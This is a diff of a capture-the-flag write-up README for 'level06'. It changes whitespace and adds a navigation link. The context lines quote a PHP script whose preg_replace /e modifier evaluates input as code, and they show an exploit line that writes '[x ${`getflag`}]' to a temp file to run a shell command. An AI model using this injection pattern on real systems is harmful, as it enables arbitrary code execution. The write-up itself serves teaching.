@@ -135,7 +135,7 @@ cat level06.php
 > 	$arg = preg_replace("/@/", " y", $arg);    // Replace @ with " y"
 > 	return $arg;
 > }
-> 
+>
 > function x($givenFile, $unusedArg) {
 > 	$content = file_get_contents($givenFile);                            // Read the content of the file
 > 	$content = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $content);  // Replace [x ...] with the RESULT of the y() function (thanks to the /e modifier)
@@ -143,7 +143,7 @@ cat level06.php
 > 	$content = preg_replace("/\]/", ")", $content);                      // Replace ] with )
 > 	return $content;
 > }
-> 
+>
 > $result = x($argv[1], $argv[2]);
 > print $result;
 > ?>
@@ -174,4 +174,4 @@ echo '[x ${`getflag`}]' > /tmp/superLegitFile
 
 ---
 
-[<<](/level05/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; >>
+[<<](/level05/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level07/resources/Readme.md)
